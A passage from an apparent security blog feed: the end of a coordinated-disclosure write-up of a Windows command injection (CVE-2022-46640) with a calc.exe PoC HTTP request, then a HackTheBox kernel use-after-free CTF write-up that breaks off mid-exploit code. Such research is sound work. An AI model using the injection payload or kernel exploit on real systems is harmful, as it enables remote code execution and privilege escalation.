}</code></pre><figcaption><code>connect(ap)</code> - dangerous function containing</figcaption></figure><p>The function <code>connect(ap)</code> sticks out because it executes a command with user input injected into the command. If we could set <code>ap.name</code> to <code>&quot;&amp; calc&amp;</code>, we should be able to start <code>calc.exe</code> on the management desktop. In order to check whether or not we could control <code>ap.name</code> from a webrequest, we ran another grep query for <code>connect</code> and got results. </p><p>We found <code>validateWifiPassword(req, res)</code> which is a callback for <code>app.post(&apos;/validateWifiPassword&apos;, ...)</code>. This function calls <code>platformWifi.connect</code>, in which <code>platformWifi</code> is a class dependent on the OS of the host. If it is Windows, it calls the vulnerable <code>connect(ap)</code> function above - otherwise it will use a secure version. This means that only Windows is vulnerable. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">let platformWifi;

if (process.platform === &apos;win32&apos;) {
    // node-wifi does not work well for some operations on Windows, so import our own library for them
    platformWifi = require(&apos;../utils/windowsWifi&apos;);
} else {
    platformWifi = wifi;
}</code></pre><figcaption><code>platformWifi</code> - the selected WiFi library</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">function validateWifiPassword(req, res) {
    const new_network = req.body.new_network;
    if (!new_network.name || !new_network.password) {
        // ...
    }
    console.log(`Checking wifi creds for ${new_network.name}...`);

    const callback = (err) =&gt; {
        // ...
    };

    let accessPoint = { name: new_network.name, password: new_network.password };
    platformWifi.connect(accessPoint, callback);
}</code></pre><figcaption><code>validateWifiPassword()</code> - the API callback function</figcaption></figure><p>The <code>validateWifiPassword()</code> function requests the parameter <code>new_network</code> with subparameters <code>name</code> and <code>password</code>. These are passed directly into <code>platformWifi.connect(accessPoint, callback)</code>, which means that there&apos;s a command injection vulnerability since we can supply an arbitrary SSID into the command <code>netsh wlan connect ssid=&quot;${ap.name}&quot;</code>.</p><h2 id="creating-a-proof-of-concept-exploit">Creating a Proof of Concept exploit</h2><p>We have vision on our exploitable primitives: command injection through an HTTP request sent to the API endpoint <code>POST /validateWifiPassword</code> hosted on a webserver that binds to 0.0.0.0:56751. Let&apos;s go through it from start to finish.</p><p>We&apos;re starting the exploit by sending a request to the following Express.js API endpoint that binds to 0.0.0.0:56751. The API endpoint triggers a call to <code>EncryptionController.validateWifiPassword()</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">app.post(&apos;/validateWifiPassword&apos;, EncryptionController.validateWifiPassword);
</code></pre><figcaption>The API endpoint registration including its callback function</figcaption></figure><p>The <code>validateWifiPassword()</code> function is a wrapper for sanitizing the user input and handling request output. The user input is expected in the HTTP body and is expected to have the form of <code>new_network.name</code> (for the WiFi SSID) and <code>new_network.password</code> (for the WiFi password). The easiest way to do this is using a JSON structure like <code>{&quot;new_network&quot;:{&quot;name&quot;:&quot;ABC&quot;,&quot;password&quot;:&quot;XYZ&quot;}}</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">function validateWifiPassword(req, res) {
    const new_network = req.body.new_network;
    if (!new_network.name || !new_network.password) {
        console.error(&quot;Invalid request object.&quot;);
        return res.sendStatus(422);
    }
    console.log(`Checking wifi creds for ${new_network.name}...`);

    const callback = (err) =&gt; {
        if (err) {
            // ...
        }
        console.log(&quot;Successfully connected  to&quot;, new_network.name);
        return res.sendStatus(204);
    };

    let accessPoint = { name: new_network.name, password: new_network.password };
    platformWifi.connect(accessPoint, callback);
}
</code></pre><figcaption><code>validateWifiPassword()</code> - the IO wrapper around <code>wifi.connect()</code></figcaption></figure><p>Next, the function <code>windowsWifi.connect()</code> gets called. This function calls the dangerous <code>execCommand</code> function plenty of times using user controllable input. Specifically, <code>new_network.name</code> gets used for the command injection. This means that we have to inject a payload as <code>new_network.name</code> to achieve RCE on the webserver.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log(&quot;using windows wifi handler&quot;);
    return scan().then((networks) =&gt; { ...
    }).then(() =&gt; {
        return execCommand(&apos;netsh wlan add profile filename=&quot;nodeWifiConnect.xml&quot;&apos;);
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;`);
    }).then(() =&gt; { ...
    }).catch((err) =&gt; {
        console.warn(&quot;windowsWifi connectToWifi Error:&quot;, err);
        return execCommand(`netsh wlan delete profile &quot;${ap.name}&quot;`).then(() =&gt; {
            return Promise.reject(err);
        });
    });
}</code></pre><figcaption><code>connect()</code> - the function containing vulnerable code</figcaption></figure><p>We&apos;re dealing with the command <code>netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;</code> and we can control <code>${ap.name}</code>. We want to execute the Windows calculator (calc.exe) to get a graphical proof of concept on the vulnerable device. To do this, we need to escape the quotes of the command and ignore the rest of the command. This would look something like <code>netsh wlan connect ssid=&quot;&quot;&amp;calc.exe&amp;::&quot; name=&quot;&quot;&amp;calc.exe&amp;::&quot;</code>where only <code>netsh wlan connect ssid=&quot;&quot;&amp; calc.exe&amp;</code> gets executed since <code>::</code> makes the rest of the line a comment. We use &amp; to background the task, so <code>netsh wlan connect ssid=&quot;&quot;</code> can fail in the background whilst <code>calc.exe</code> can succeed in the background. This means that we need to make our SSID <code>&quot;&amp;calc.exe&amp;::</code>. The entire HTTP request would become as follows. </p><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
content-type: application/json
Content-Length: 61

{&quot;new_network&quot;:{&quot;name&quot;:&quot;\&quot;&amp;calc.exe&amp;::&quot;,&quot;password&quot;:&quot;xyz&quot;}}</code></pre><figcaption>The PoC payload executing <code>calc.exe</code> on the target device</figcaption></figure><h2 id="conclusion">Conclusion</h2><p>In conclusion, we exploited a command injection vulnerability by sending an HTTP request to a remote vulnerable Express.js API webserver that binds to all interfaces. Our internal research concluded that it&apos;s possible to make a fully fletched shell using vulnerabilities in this app, that could upload/download files and execute commands which would make it ideal for attackers. </p><p>The mitigations for these vulnerabilities would be as follows: only bind to interfaces that need access (in this case 127.0.0.1) to prevent remote access all together; sanitize controllable user input (especially when executing commands); disable remote wireless reconfiguration all together to prevent MitM attacks; disable arbitrary file operations (c.q. reading and writing) as it will only introduce vulnerabilities. </p><p>Going forward, we recommend users to keep their software up-to-date as vendors continuously release patches for vulnerabilities like those shown in this blogpost. Additionally we recommend more advanced users to use firewalls on their devices, which should deny incoming traffic by default as it can prevent lots of vulnerabilities. </p><p>Furthermore, the vulnerabilities in said desktop app were patched by the vendor in December 2022, a month after coordinated vulnerability disclosure (CVD). The vendor gave us explicit permission to publish this blogpost (under the agreement we wouldn&apos;t mention the vendors name nor desktop app name) and to publish <code>CVE-2022-46640</code>. </p><p></p><p>We hope you learned reading this blogpost as much as we did researching the vulnerabilities, and thank you for taking the time to read this blogpost.</p><p>Notselwyn, March 2023</p>]]></content:encoded></item><item><title><![CDATA[Knote (HackTheBox)]]></title><description><![CDATA[<p>Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a <strong>local privilege escalation</strong> attack by exploiting a <strong>use-after-free </strong>bug. The description of the challenge is as follows:</p><blockquote>Secure your secrets in the kernel space!</blockquote><h2 id="summary">Summary</h2><ul><li>What are kernel modules?</li><li>How</li></ul>]]></description><link>https://pwning.tech/knote/</link><guid isPermaLink="false">658f44f8d32e980001de21ed</guid><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[Linux Syscalls]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[Linux Kernel]]></category><category><![CDATA[Heap Memory]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sun, 15 Jan 2023 23:21:55 GMT</pubDate><content:encoded><![CDATA[<p>Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a <strong>local privilege escalation</strong> attack by exploiting a <strong>use-after-free </strong>bug. The description of the challenge is as follows:</p><blockquote>Secure your secrets in the kernel space!</blockquote><h2 id="summary">Summary</h2><ul><li>What are kernel modules?</li><li>How does this kernel CTF work?</li><li>Analyzing the kmodule</li><li>Finding primitives</li><li>Creating an exploit</li><li>Creating a real world version</li></ul><h2 id="what-are-kernel-modules">What are kernel modules?</h2><p>Linux kernel modules are a way to extend the Linux kernel in a hotswappable way. Kernel modules are also used for creating drivers, which is why it&apos;s useful to learn how to exploit them. Thankfully, you can use the same pwn / exploitation techniques in kernel modules as in the core Linux kernel.</p><p>Kernel modules (kmodules) can do a lot of things that the core kernel can do as well: manage a virtual filesystem such as <code>/proc</code>, manage task structs, et cetera. They can register a device file as well, which you can use to communicate with the kmodule using read(), write(), ioctl(), et cetera. </p><p>You can insert, list, and remove kernel modules by respectively using the binaries <code>insmod</code>, <code>lsmod</code>, and <code>rmmod</code>. </p><h2 id="how-do-kernel-pwn-ctfs-work">How do kernel pwn CTFs work?</h2><p>The goal of most kernel pwn CTFs are local privilege escalation exploits, in which a user becomes root in order to read a root-only flag file. Typically, you will be given 3 files: </p><ul><li><code>qemu.sh</code>: a BASH script to run a QEMU command. QEMU (Quick EMUlator) is a FOSS instructionset simulator which you can use to run custom Linux kernels in custom filesystems. It may sound like a VM, but it is not. </li><li><code>initramfs.cpio.gz</code> / <code>rootfs.img</code>: the custom (compressed) filesystem to run QEMU with. </li><li><code>bzImage</code> : the custom Linux kernel to run QEMU with. </li></ul><p>Make sure to remove <code>-no-kvm</code> from <code>qemu.sh</code> as it is for old versions of Qemu. Also <strong>note that there&apos;s no kaslr, no smap, no smep, etc</strong>. </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

timeout --foreground 35 qemu-system-x86_64 -m 128M \
  -kernel ./bzImage \
  -append &apos;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&apos; \
  -monitor /dev/null \
  -initrd ./initramfs.cpio.gz \
  -cpu qemu64 \
  -smp cores=1 \
  -nographic
</code></pre><figcaption><p><span style="white-space: pre-wrap;">qemu.sh content</span></p></figcaption></figure><p>Now you might see that I use <code>initramfs.cpio.gz</code> instead of the <code>initramfs.cpio.gz</code> which is supplied in the challenge. This is because I first extracted it using <code>cpio -iF rootfs.img</code>. After that, I used the following scripts to compress and decompress the resulting directory:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

if [ &quot;$1&quot; = &quot;&quot; ]; then
    echo &quot;usage: $0 &lt;initramfs.cpio.gz&gt;&quot;;
else

    # Decompress a .cpio.gz packed file system
    mkdir initramfs
    pushd . &amp;&amp; pushd initramfs
    cp ../$1 .
    gzip -dc $1 | cpio -idm &amp;&gt;/dev/null &amp;&amp; rm $1
    popd
fi
</code></pre><figcaption><p><span style="white-space: pre-wrap;">decompress.sh</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

# Compress initramfs with the included statically linked exploit
in=$1
out=$(echo $in | awk &apos;{ print substr( $0, 1, length($0)-2 ) }&apos;)
musl-gcc $in -static -pie -s -O0 -fPIE -o $out || exit 255
mv $out initramfs
pushd . &amp;&amp; pushd initramfs
find . -print0 | cpio --null --format=newc -o 2&gt;/dev/null | gzip -9 &gt; ../initramfs.cpio.gz
popd
</code></pre><figcaption><p><span style="white-space: pre-wrap;">compress.sh</span></p></figcaption></figure><p>So firstly I create an <code>initramfs.cpio.gz</code> for QEMU using <code>irfs_compress.sh initramfs/exploit.c &amp;&amp; ./qemu-cmd.sh</code>. Now, we can test QEMU by running <code>./qemu.sh</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">sh: can&apos;t access tty; job control turned off
~ $ whoami
user
~ $</code></pre><figcaption><p><span style="white-space: pre-wrap;">Qemu proof-of-concept (PoC)</span></p></figcaption></figure><h2 id="analyzing-the-kmodule">Analyzing the kmodule</h2><p>We are given the following C sourcecode of the <code>knote.ko</code> kernel module:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;linux/kernel.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/mutex.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/uaccess.h&gt;

#define DEVICE_NAME &quot;knote&quot;
#define CLASS_NAME &quot;knote&quot;

MODULE_AUTHOR(&quot;r4j&quot;);
MODULE_DESCRIPTION(&quot;Secure your secrets in the kernelspace&quot;);
MODULE_LICENSE(&quot;GPL&quot;);

static DEFINE_MUTEX(knote_ioctl_lock);
static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

static int major;
static struct class *knote_class  = NULL;
static struct device *knote_device = NULL;
static struct file_operations knote_fops = {
    .unlocked_ioctl = knote_ioctl
};

struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};

struct knote_user {
    unsigned long idx;
    char * data;
    size_t len;
};

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};

struct knote *knotes[10];

void knote_encrypt(char * data, size_t len) {
    int i;
    for(i = 0; i &lt; len; ++i)
        data[i] ^= 0xaa;
}

void knote_decrypt(char *data, size_t len) {
    knote_encrypt(data, len);
}

static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;
    switch(cmd) {
        case KNOTE_CREATE:
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            if(data == NULL || knotes[ku.idx] == NULL) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -ENOMEM;
            }

            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        case KNOTE_DELETE:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            knotes[ku.idx] = NULL;
            break;
        case KNOTE_READ:
            if(ku.idx &gt;= 10 || !knotes[ku.idx] || ku.len &gt; knotes[ku.idx]-&gt;len) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            if(copy_to_user(ku.data, knotes[ku.idx]-&gt;data, ku.len)) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            break;
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         case KNOTE_DECRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            knotes[ku.idx]-&gt;decrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}

static int __init init_knote(void) {
    major = register_chrdev(0, DEVICE_NAME, &amp;knote_fops);
    if(major &lt; 0)
        return -1;

    knote_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(knote_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    knote_device = device_create(knote_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
    if (IS_ERR(knote_device))
    {
        class_destroy(knote_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    return 0;
}

static void __exit exit_knote(void)
{
    device_destroy(knote_class, MKDEV(major, 0));
    class_unregister(knote_class);
    class_destroy(knote_class);
    unregister_chrdev(major, DEVICE_NAME);
}

module_init(init_knote);
module_exit(exit_knote);
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Knote.c sourceode</span></p></figcaption></figure><p>The first thing that the kernel calls in a newly inserted module (c.q. <code>knote.ko</code>) is the function with keyword <code>__init</code>, which in this case belongs to the following init functions:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int __init init_knote(void) {
    major = register_chrdev(0, DEVICE_NAME, &amp;knote_fops);
    if(major &lt; 0)
        return -1;

    knote_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(knote_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    knote_device = device_create(knote_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
    if (IS_ERR(knote_device))
    {
        class_destroy(knote_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">First function called in the kmodule</span></p></figcaption></figure><p>As we can see, it registers a character device (<code>chrdev</code>) with the name &quot;knote&quot; and it enables the device operation <code>unlocked_iotctl</code>, which means that it&apos;s possible to interact with the device using <code>ioctl()</code>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">static struct file_operations knote_fops = {
    .unlocked_ioctl = knote_ioctl
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Knote.ko file operations</span></p></figcaption></figure><p>This means that our only userland form of messing with the kmodule is using <code>ioctl()</code> to interact with the <code>knote_ioctl</code> function. As said, we need to use <code>int ioctl(int fd, unsigned long request, ...)</code> in the exploit to pass the file, cmd and arg arguments to <code>long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg)</code> . This function performs several commands: <code>KNOTE_CREATE</code>, <code>KNOTE_DELETE</code>, <code>KNOTE_READ</code>, <code>KNOTE_ENCRYPT</code> and <code>KNOTE_DECRYPT</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        case KNOTE_CREATE:
            // unsigned values
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;

            // create knote
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            if(data == NULL || knotes[ku.idx] == NULL) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -ENOMEM;
            }

            // copy userdata to note data
            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        case KNOTE_DELETE:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            knotes[ku.idx] = NULL;
            break;
        case KNOTE_READ:
            if (ku.idx &gt;= 10 || !knotes[ku.idx] || ku.len &gt; knotes[ku.idx]-&gt;len)
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            
            if (copy_to_user(ku.data, knotes[ku.idx]-&gt;data, ku.len)) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            break;
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         case KNOTE_DECRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;decrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>knote_ioctl()</span></code><span style="white-space: pre-wrap;"> - used for interacting throug </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ioctl()</span></code></p></figcaption></figure><p>As we can read, the <code>arg</code> parameter is used to supply values to a <code>knote_user</code> object, using <code>copy_from_user(&amp;ku, arg, sizeof(struct knote_user))</code>: copies <code>sizeof(struct knote_user)</code> bytes from userland pointer <code>arg</code> to kernel pointer <code>ko</code>. Secondly, it executes one of the <code>KNOTE_&lt;CMD&gt;</code> cases. </p><h2 id="finding-primitives">Finding primitives</h2><p>The first step of exploit development is identifying protections: earlier we found out that there&apos;s no active kernel protections (no kaslr, no smap, no smep, et cetera). Next, there&apos;s finding exploit primitives: let&apos;s start off with finding execution flow hijacking. Firstly I checked for any forms of buffer overflow bugs on the stack and on the heap, but I couldn&apos;t find anything. However, once I took a look at <code>KNOTE_CREATE</code>, I saw that a use-after-free bug can be triggered. </p><h3 id="finding-a-memory-corruption-bug">Finding a memory corruption bug</h3><p>The <code>KNOTE_CREATE</code> command allocates a knote and it&apos;s data using <code>kmalloc</code>, which stands for <strong>k</strong>ernel <strong>malloc</strong>. Then, it tries to copy the userland data to the kernel note data. However if that copy fails, it will <code>kfree</code> (<strong>k</strong>ernel <strong>free</strong>) both the kernel note and the kernel notes&apos; data.</p><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        case KNOTE_CREATE:
            // unsigned values
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;

            // create knote
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            // ...
            
            // copy userdata to note data
            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        // ...
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><p>Before we dive into the details, please realize that the kernel heap cache works like a stack containing heap chunk pointers: you push them with kfree and pop them with kmalloc </p><p>It took me a bit of puzzling but I figured out that we can leverage this to trigger a <strong>use-after-free</strong> (UAF) bug. If we create a knote that fails <code>copy_from_user</code> by providing an invalid pointer, the kmodule will <code>kfree(data)</code> and after that it will <code>kfree(knote)</code> but it <strong>wont reset </strong><code>knotes[ku.idx] = NULL</code>. Additionally, the allocation is in the wrong order of <code>kmalloc(data)</code> and then <code>kmalloc(knote)</code>. Because of this, a weird UAF scenario arises in the kernel memory cache where we can overwrite <code>knotes[ku.idx]</code> with userland <code>ku.data</code>. For clarification of this mindboggling bug I have made the following diagram:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2023/01/image-1.png" class="kg-image" alt loading="lazy" width="1668" height="317" srcset="https://pwning.tech/content/images/size/w600/2023/01/image-1.png 600w, https://pwning.tech/content/images/size/w1000/2023/01/image-1.png 1000w, https://pwning.tech/content/images/size/w1600/2023/01/image-1.png 1600w, https://pwning.tech/content/images/2023/01/image-1.png 1668w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Description of th UAF bug</span></figcaption></figure><h3 id="finding-a-way-to-hijack-execution-flow">Finding a way to hijack execution flow</h3><p>Now we have a UAF bug, we need to find ways to get code execution by utilizing it. After analyzing more commands, I noted that the <code>KNOTE_ENCRYPT</code> command calls <code>knote-&gt;encrypt_func</code>, stored in the <code>knote</code> structure. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>knote</span></code><span style="white-space: pre-wrap;"> structure</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        // ...
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         // ...
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>KNOTE_ENCRYPT</span></code><span style="white-space: pre-wrap;"> command</span></p></figcaption></figure><p>This means that we can execute arbitrary code by committing a UAF bug, overwrite <code>knote-&gt;encrypt_func</code> and calling it. </p><h2 id="creating-an-exploit">Creating an exploit</h2><p>So now we have our primitives to get local code execution through a UAF bug in the kernel module, we can start building the exploit. Firstly, I defined a bunch of kernel module specific code, such as the structures and <code>ioctl()</code> calls to interact with the kmodule. These structures are copy/pasted from the <code>knote.c</code> file.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int FD_KNOTE;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};


typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;


typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    knote_user_t user;
    user.idx = idx;
    user.data = data;
    user.len = len;

    int retv = ioctl(FD_KNOTE, cmd, &amp;user);
    printf(&quot;ioctl(fd=%d, cmd=0x%x, &amp;ku=%p) -&gt; %d\n&quot;, FD_KNOTE, cmd, &amp;user, retv);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The contextual part of the exploit</span></p></figcaption></figure><p>After I got all necessary kernel module code, I created the UAF code. Please ignore the <code>set_ctx_reg()</code> and <code>&amp;privesc_ctx_swp</code>  variables. As you can see, we&apos;re firstly triggering the swap by allocating a knote with an invalid data pointer so that <code>kn-&gt;data</code> becomes <code>kn</code>. Then, we&apos;re allocating our custom <code>kn</code> by passing it as <code>kn-&gt;data</code>. Please note that I&apos;m using knote index 1, and not 0 to prevent <code>encrypt_func</code> from being overwritten in the following code of <code>knote.c</code>:</p><figure class="kg-card kg-code-card"><pre><code>switch(cmd) {
    case KNOTE_CREATE:
		// copy userdata to note data
        knotes[ku.idx]-&gt;data = data;
        knotes[ku.idx]-&gt;len = ku.len;
        if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EFAULT;
        }
        knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
        knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The code overwriting </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encrypt_func</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include &quot;kpwn.c&quot;


int FD_KNOTE;

enum knote_ioctl_cmd {
    // ...
};


typedef struct {
    // ...
} knote_user_t;


typedef struct {
    // ...
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
	// ...
}

void main()
{
    FD_KNOTE = open(&quot;/dev/knote&quot;, O_RDONLY);
    if (FD_KNOTE &lt; 0)
    {
        puts(&quot;main(): open failed&quot;);
        exit(1);
    }

    /* case KNOTE_CREATE:
     *     char *data = kmalloc(ku.len, GFP_KERNEL);
